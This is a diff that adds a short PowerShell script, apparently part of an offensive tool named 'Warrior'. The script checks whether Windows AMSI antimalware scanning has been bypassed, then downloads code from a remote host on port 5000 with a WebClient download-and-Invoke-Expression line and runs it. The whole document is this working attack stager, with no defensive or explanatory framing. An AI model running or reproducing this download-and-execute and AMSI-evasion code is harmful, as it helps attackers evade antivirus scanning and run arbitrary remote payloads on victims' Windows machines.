@@ -1,0 +1,11 @@
+amsiutils
+$wError=$error[0]|out-string
+
+if ($wError.contains('recognized')) {
+   Write-Output "Amsi has been disabled successfully"
+}else{
+    Write-Output "Amsi stills active"
+}
+Write-Output "Warrior Running"
+Invoke-Expression(new-object net.webclient).downloadstring('http://'+$global:remoteip+':5000/consola');consola
+
